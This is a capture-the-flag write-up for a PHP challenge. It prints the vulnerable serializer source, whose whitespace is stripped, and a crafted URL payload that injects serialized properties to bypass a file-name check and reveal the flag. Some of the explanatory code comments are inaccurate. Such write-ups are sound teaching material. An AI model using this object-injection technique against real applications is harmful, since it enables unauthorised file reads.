# 1. Jsonify
Challenge Description: Everyone's telling me that serialize/unserialize should not be used with user-supplied input. Alright, I implemented my own JSON-based (un)serializer, so all potential vulnerabilities are gone, right?

link: http://52.59.124.14:10002/

Solution:<br>
+ Given the following code:
```
<? phpini_set('allow_url_fopen', false);
interfaceSecurSerializable
{
    publicfunction__construct();
    publicfunction__shutdown();
    publicfunction__startup();
    publicfunction__toString();
}
classFlagimplementsSecurSerializable
{
    public $flag;
    public $flagfile;
    public $properties = array();
    publicfunction__construct($flagfile = null) //__construct allows you to initialise an object's properties upon creation of the object
    {
        if (isset($flagfile))
        {
            $this->flagfile = $flagfile;
        }
    }
    publicfunction__shutdown()
    {
        return $this->properties;
    }
    publicfunction__startup()  //he compiler looks for a special function named __STARTUP() when it compiles your source code
    {
        $this->readFlag();
    }
    publicfunction__toString()  //return string contents of an element
    {
        return "ClassFlag(" . $this->flag . ")";
    }
    publicfunctionsetFlag($flag)
    {
        $this->flag = $flag;
    }
    publicfunctiongetFlag()
    {
        return $this->flag;
    }
    publicfunctionsetFlagFile($flagfile)
    {
        if (stristr($flagfile, "flag") || !file_exists($flagfile)) //strisstr() checks the first occurence of a string inside another string.
        {
            echo "ERROR:Fileisnotvalid!";
            return;
        }
        $this->flagfile = $flagfile;
    }
    publicfunctiongetFlagFile()
    {
        return $this->flagfile;
    }
    publicfunctionreadFlag()
    {
        if (!isset($this->flag) && file_exists($this->flagfile))
        {
            $this->flag = join("", file($this->flagfile));
        }
    }
    publicfunctionshowFlag()
    {
        if ($this->isAllowedToSeeFlag)
        {
            echo "Theflagis:" . $this->flag;
        }
        else
        {
            echo "Theflagis:[You'renotallowedtoseeit!]";
        }
    }
}
functionsecure_jsonify($obj)
{
    $data = array();
    $data['class'] = get_class($obj);
    $data['properties'] = array();
    foreach ($obj->__shutdown() as & $key)
    {
        $data['properties'][$key] = serialize($obj->$key);
    }
    returnjson_encode($data);
}
functionsecure_unjsonify($json, $allowed_classes)
{
    $data = json_decode($json, true);
    if (!in_array($data['class'], $allowed_classes))
    {
        thrownewException("ErrorProcessingRequest", 1);
    }
    $obj = new $data['class']();
    foreach ($data['properties'] as $key => $value)
    {
        $obj->$key = unserialize($value, ['allowed_classes' => false]);
    }
    $obj->__startup();
    return $obj;
}
if (isset($_GET['show']) && isset($_GET['obj']) && isset($_GET['flagfile']))
{
    $f = secure_unjsonify($_GET['obj'], array(
        'Flag'
    ));
    $f->setFlagFile($_GET['flagfile']);
    $f->readFlag();
    $f->showFlag();
}
elseif (isset($_GET['show']))
{
    $f = newFlag();
    $f->flagfile = "./flag.php";
    $f->readFlag();
    $f->showFlag();
}
else
{
    header("Content-Type:text/plain");
    echopreg_replace('/\s+/', '', str_replace("\n", '', file_get_contents("./index.php")));
} //With<3by@gehaxelt
 ?>
```
+ After reading the code, lets cut out the code into following four codeS:
   + (isset($_GET['show']) && isset($_GET['obj']) && isset($_GET['flagfile']))
   + $obj->$key = unserialize($value, ['allowed_classes' => false]);
   + $this->isAllowedToSeeFlag
   + if (stristr($flagfile, "flag") || !file_exists($flagfile))
        {
            echo "ERROR:Fileisnotvalid!";
            return;
        }
        $this->flagfile = $flagfile;
       
+ From the above, we can craft a payload as follows:<br>
`52.59.124.14:10002/?show=1&obj={"class":"Flag","properties":{"isAllowedToSeeFlag":"i:1;","flagfile":"s:8:\"flag.php\";"}}&flagfile=naiailoveyou`<br>
There we get a message like 'error: file not found, the flag is: ' then we check the view source and we get the flag.<br>
flag: ENO{PHPwn_1337_hakkrz}


